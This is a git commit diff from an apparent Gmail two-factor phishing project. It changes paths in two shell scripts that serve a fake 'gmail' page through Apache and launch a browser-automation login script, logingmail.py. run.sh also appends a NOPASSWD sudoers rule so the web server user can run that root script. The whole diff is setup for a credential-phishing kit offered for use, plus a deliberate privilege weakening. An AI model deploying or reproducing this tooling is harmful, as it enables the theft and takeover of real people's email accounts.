806bcbb07d26b26cce92682e26fa8a57820b7170
code34348 <88024661+code34348@users.noreply.github.com>
2022-12-15 00:40:29 -0800

    Add files via upload

--- root.sh
+++ root.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 # script that runs as root
 # The display number must be a desktop session valid, you can view with echo $DISPLAY
-export PATH=$PATH:/root/2FAGmailPhising/geckodriver
-DISPLAY=:1 python /root/2FAGmailPhising/logingmail.py &
+export PATH=$PATH:/home/code8/2fagmail/geckodriver
+DISPLAY=:1 python /home/code8/2fagmail/logingmail.py &
--- run.sh
+++ run.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 cp -r gmail /var/www/html
 chown -R www-data:www-data /var/www
-echo -n "www-data ALL=(user) NOPASSWD: /root/2FAGmailPhising/root.sh" >> /etc/sudoers
+echo -n "www-data ALL=(user) NOPASSWD: /home/code8/2fagmail/root.sh" >> /etc/sudoers
 service apache2 restart
 echo "The service is running in http://yourserver-ip/gmail/"
